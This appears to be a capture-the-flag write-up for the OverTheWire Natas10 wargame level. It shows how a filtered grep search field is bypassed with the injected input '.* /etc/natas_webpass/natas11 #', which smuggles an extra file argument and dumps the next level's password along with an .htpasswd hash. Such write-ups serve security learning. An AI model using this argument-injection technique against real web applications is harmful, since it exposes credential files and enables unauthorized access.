# Natas10

*	user: `natas10`
*	pass: `nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu`
*	url: `http://natas10.natas.labs.overthewire.org`
*	flag: `U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK`

## Procedure

1.	It seems to be similar to Natas9 but here chars `;`, `&` and `|`
	are not allowed. Let's try with other *magic* symbols...

2.	By inserting `*` seems that something is mooving in the right way.
	Indeed, `grep` supports wildcards, so let's try with `.*`...

3.	Well! Files in current dir are listed, but `dictionary.txt` is huge

		.htaccess:AuthType Basic
		.htaccess: AuthName "Authentication required"
		.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
		.htaccess: require valid-user
		.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
		dictionary.txt:African
		dictionary.txt:Africans
		dictionary.txt:Allah
		dictionary.txt:Allah's
		dictionary.txt:American
		...

4.	Let's try to exclude it by using `.* #`...

		.htaccess:AuthType Basic
		.htaccess: AuthName "Authentication required"
		.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
		.htaccess: require valid-user
		.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.

5.	Yep! I feel the smell of the flag! As is Natas7 and Natan9, now
	password should be in

		/etc/natas_webpass/natas11

	Let's try by injecting `.* /etc/natas_webpass/natas11 #`

		.htaccess:AuthType Basic
		.htaccess: AuthName "Authentication required"
		.htaccess: AuthUserFile /var/www/natas/natas10//.htpasswd
		.htaccess: require valid-user
		.htpasswd:natas10:$1$sDWfJg4Y$ewf9jvw0ChWUA3KARHisg.
		/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
